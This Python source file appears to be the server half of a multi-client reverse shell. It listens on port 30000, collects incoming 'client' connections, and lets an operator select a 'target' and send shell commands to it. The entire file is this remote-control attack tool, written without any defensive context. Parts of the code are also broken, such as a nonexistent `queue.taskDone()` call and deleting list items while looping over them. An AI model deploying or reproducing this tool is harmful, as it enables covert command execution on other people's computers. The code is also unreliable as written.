import socket #how client will connect
import sys #how to run system commands
import threading
import time
from queue import Queue


#number of clients that can connect
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
allConnections = []
allAddresses = []


# create socket that will allow client to connect to server
def socketCreate():
    try:
        global host
        global port
        global s
        host = ''
        port = 30000
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Bind socket to port and wait for connection from client
def socketBind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying")
        socketBind()


# Accept connections from multiple clients and sve to list
def acceptConnections():
    for openConnections in allConnections:
        openConnections.close()
    del allConnections[:]
    del allAddresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            allConnections.append(conn)
            allAddresses.append(address)
            print("\nConnection has been established with: " + address[0])
        except:
            print("Error accepting connections")

# Interactive prompt for sending commands
def startShell():
    while True:
        cmd = input('shell> ')
        if cmd == 'list':
            listConnections()
        elif 'select' in cmd:
            conn = getTarget(cmd)
            if conn is not None:
                sendTargetCommands(conn)
        else:
            print("Command not recognized")

# this will list all connections
def listConnections():
    results = ''
    for i, conn in enumerate(allConnections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del allConnections[i]
            del allAddresses[i]
            continue
        results += str(i) + '   ' + str(allAddresses[i][0]) + str(allAddresses[i][1]) + '\n'
    print('----Clients---' + '\n' + results)



# how to select particular connection
def getTarget(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = allConnections[target]
        print("You are now connec to " + str(allAddresses[target][0]))
        print(str(allAddresses[target][0]) + '> ', end="")
        return conn
    except:
        print("not a valid selection")
        return None

# Send commands to target
def sendTargetCommands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                clientResponse = str(conn.recv(20480), "utf-8")
                print(clientResponse, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break


# Create threads
def createWorkers():
    for _ in range(NUMBER_OF_THREADS):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()

# do the next job in the queue one handles connections, the other commands
def work():
    while True:
        x = queue.get()
        if x == 1:
            socketCreate()
            socketBind()
            acceptConnections()
        if x == 2:
            startShell()
        queue.taskDone()
# Each list item is a new jobNumber
def createJobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

createWorkers()
createJobs()
